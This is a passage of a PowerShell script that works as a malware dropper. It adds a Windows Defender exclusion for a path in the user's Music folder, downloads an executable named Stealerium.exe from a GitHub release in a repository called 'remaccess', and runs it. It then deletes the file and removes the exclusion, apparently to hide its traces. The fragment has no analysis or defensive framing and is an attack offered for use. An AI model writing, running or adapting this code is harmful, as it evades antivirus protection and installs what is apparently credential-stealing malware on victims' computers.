[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/Stealerium.exe"
$exepath = Join-Path $env:USERPROFILE "Music\$Name.exe"
Add-MpPreference -ExclusionPath $exepath
Invoke-WebRequest -Uri $url -OutFile $exepath	
Start-Process -FilePath $exepath
if ($null -ne $output) {
Remove-Item -Path $exepath -Recurse -Force -ErrorAction SilentlyContinue
} else {}
Remove-MpPreference -ExclusionPath $exepath
}
else {}
